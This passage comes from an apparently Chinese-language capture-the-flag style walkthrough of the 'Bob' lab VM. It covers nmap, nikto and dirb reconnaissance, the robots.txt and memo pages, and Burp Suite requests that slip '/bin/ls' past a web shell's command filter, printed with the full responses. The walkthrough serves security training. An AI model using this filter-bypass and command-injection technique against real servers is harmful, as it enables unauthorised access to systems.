36416 (35.5 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 448  bytes 36416 (35.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105100943.png" class="" title="image-20240104105100943">
<p><code>192.168.233.135</code>kali IP段</p>
<p><code>nmap -sP 192.168.233.0/24</code></p>
<p>查看kali本机IP<br>全面探测端口并将结果导出至<code>nmap.A</code>，全面扫描是因为有些服务会被改端口号，而我们会用到这些端口号，可以看到ssh端口被改。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.233.0/24</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.1</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.2</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:50:56:EA:3E:CA (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.138</span><br><span class="line">Host is up (0.000075s latency).</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.254</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">MAC Address: 00:50:56:F7:F3:DD (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.135</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105348461.png" class="" title="image-20240104105348461">
<p>bob地址</p>
<blockquote>
<p><code>192.168.233.138</code></p>
</blockquote>
<p>nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:58 CST</span><br><span class="line">Nmap scan report for 192.168.233.138</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">| /login.php /dev_shell.php /lat_memo.html </span><br><span class="line">|_/passwords.html</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 84f2f8e5ed3e14f393d41e4c413ba2a9 (RSA)</span><br><span class="line">|   256 5b98c74f846efd566a351683aa9ceaf8 (ECDSA)</span><br><span class="line">|_  256 391656fb4e0f508540d3532241433815 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.30 ms 192.168.233.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds</span><br></pre></td></tr></table></figure>
<p>收集到靶机开启了http和ssh服务及其对应的端口号和版本。<br><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/88273c8bd8574284b500608dd88d3c39.png" class="" title="在这里插入图片描述"></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://192.168.233.138/">192.168.233.138</a></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104110302654.png" class="" title="image-20240104110302654">
</blockquote>
<p>经验：多点点多看看，挖掘有用信息，通过浏览网站页面，我们推测Bob J可能是管理员。<br><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/ca353b6520cc4aac92ab4efecbff6865.png" class="" title="在这里插入图片描述"></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/a170dfe4c21442a4a16ddbc44c58bb20.png" class="" title="在这里插入图片描述">
<p>使用nikto工具扫描网站后台信息，其中Robots.txt代表反爬虫机制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.233.138</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104111710582.png" class="" title="image-20240104111710582">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nikto -h http://192.168.233.138</span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.233.138</span><br><span class="line">+ Target Hostname:    192.168.233.138</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-01-04 11:16:47 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.25 (Debian)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ /robots.txt: Entry &#x27;/dev_shell.php&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/lat_memo.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/passwords.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ /: Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span><br></pre></td></tr></table></figure>
<p>这是一次使用Nikto工具对名为”Bob”的靶机（IP地址192.168.233.138）进行的网络安全扫描报告。Nikto是一种流行的开源网络安全扫描工具，用于检测网站的潜在漏洞。以下是对扫描结果的解释和分析：</p>
<ol>
<li><p><strong>目标信息</strong>:</p>
<ul>
<li>IP地址: 192.168.233.138</li>
<li>主机名: 192.168.233.138</li>
<li>目标端口: 80（通常用于HTTP服务）</li>
<li>扫描时间: 2024年1月4日 11:16:47（GMT+8）</li>
</ul>
</li>
<li><p><strong>发现的问题和潜在漏洞</strong>:</p>
<ul>
<li><strong>Web服务器版本</strong>: 使用的是Apache/2.4.25 (Debian)，该版本可能已过时，因为最新的Apache版本至少是2.4.54。使用过时的软件版本可能会暴露已知的安全漏洞。</li>
<li><strong>X-Frame-Options未设置</strong>: 此HTTP响应头用于防止点击劫持攻击。未设置此头可能使网站容易受到此类攻击。</li>
<li><strong>缺少X-Content-Type-Options</strong>: 未设置此头可能允许浏览器以与MIME类型不同的方式解释网站内容，可能导致安全问题。</li>
<li><strong>robots.txt文件的内容</strong>: 发现’/dev_shell.php’、’/lat_memo.html’和’/passwords.html’路径在robots.txt文件中，但可以访问。这可能意味着这些路径包含敏感信息或功能，但未被适当保护。</li>
<li><strong>ETags信息泄露</strong>: 服务器配置可能会泄漏inode信息，这可以被用来执行一些特定的攻击，如inode枚举。</li>
<li><strong>允许的HTTP方法</strong>: 发现服务器允许OPTIONS, HEAD, GET, POST方法。额外的方法，特别是OPTIONS，可能会暴露过多的信息给潜在的攻击者。</li>
</ul>
</li>
<li><p><strong>攻击和防御策略</strong>:</p>
<ul>
<li><strong>更新Apache服务器</strong>: 应该更新到最新版本以修复已知的安全漏洞。</li>
<li><strong>配置安全HTTP头</strong>: 应设置X-Frame-Options和X-Content-Type-Options头以增强安全性。</li>
<li><strong>审核robots.txt文件</strong>: 检查robots.txt文件中提到的路径，确保不会公开敏感信息或功能。</li>
<li><strong>限制HTTP方法</strong>: 考虑限制服务器上允许的HTTP方法，只允许必要的方法。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.233.138</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.233.138</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan  4 11:37:11 2024</span><br><span class="line">URL_BASE: http://192.168.233.138/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.233.138/ ----</span><br><span class="line">+ http://192.168.233.138/index.html (CODE:200|SIZE:1425)                                        </span><br><span class="line">+ http://192.168.233.138/robots.txt (CODE:200|SIZE:111)                                         </span><br><span class="line">+ http://192.168.233.138/server-status (CODE:403|SIZE:303)                                      </span><br><span class="line">                                                                                                </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jan  4 11:37:14 2024</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113747750.png" class="" title="image-20240104113747750">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /login.php</span><br><span class="line">Disallow: /dev_shell.php</span><br><span class="line">Disallow: /lat_memo.html</span><br><span class="line">Disallow: /passwords.html</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113947574.png" class="" title="image-20240104113947574">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Really who made this file at least get a hash of your password to display, hackers can&#x27;t do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don&#x27;t make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &gt;:(</span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114138182.png" class="" title="image-20240104114138182">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Memo sent at GMT+10:00 2:37:42 by User: Bob</span><br><span class="line">Hey guys IT here don&#x27;t forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.</span><br><span class="line"></span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114223567.png" class="" title="image-20240104114223567">
<p><code>uname -a</code></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114350590.png" class="" title="image-20240104114350590">
<p>Output:</p>
<p>Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux</p>
<p><strong>BP爬虫</strong>：浏览网页文件，在dev.shell.php中发现有些命令无法使用，因此推测网站存在过滤机制，可能存在白名单。这时候需要用到抓包神器BP：burpsuite，通过抓包搜集有用信息。</p>
<blockquote>
<p>burpsuite</p>
</blockquote>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114724876.png" class="" title="image-20240104114724876">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104134629831.png" class="" title="image-20240104134629831">
<p>首先需要将本地端口号修改为其他服务不用的端口号，然后把网站流量引流到127.0.0.1的8888端口，需要安装插件foxyproxy，同时新增一项BP并开启foxyproxy。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104135039398.png" class="" title="image-20240104135039398">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104140414325.png" class="" title="image-20240104140414325">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104162504862.png" class="" title="image-20240104162504862">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104142417794.png" class="" title="image-20240104142417794">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104164728109.png" class="" title="image-20240104164728109">
<p>在dev.shell.php页面输入ls(之前不让访问的命令)，然后在BP中抓包，将抓到的包send to Repeater模块（重放模块），然后点击intercept is on，即关闭拦截抓包，这样dev.shell.php页面就能接收到先前输入的ls，对方网页也就不会发现异常了。之后点击repeater模块的send按钮，得到response。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=ls</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:26:16 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 675</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    #back&#123;</span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      #shell&#123;</span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don&#x27;t forget to report any bugs we don&#x27;t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    Get out skid lol</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试绕过网站安全机制，猜测网站使用了命令拦截，可以在response中看到黑名单（会拦截的命令）。ls在根下的bin目录中，因此尝试将<code>in_command</code>即输入的命令更改为<code>/bin/ls</code>（通过篡改命令潜入对方网站），此时可以看到web根目录下所有的网页内容，基于此，我们搜集有用内容（<code>php</code>页面包含信息更多，<code>.bak</code>后缀通常为备份文件）。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=/bin/ls</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:35:48 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 845</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    <span class="comment">#back&#123;</span></span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">#shell&#123;</span></span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don<span class="string">&#x27;t forget to report any bugs we don&#x27;</span>t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div <span class="built_in">id</span>=<span class="string">&quot;shell&quot;</span>&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;dev_shell.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">      Command: &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;in_command&quot;</span> /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;dev_shell_back.png&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;back&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下载<code>bak</code>文件并查看<code>vim dev_shell.php.bak</code></p>
<blockquote>
<p>dev_shell.php.bak</p>
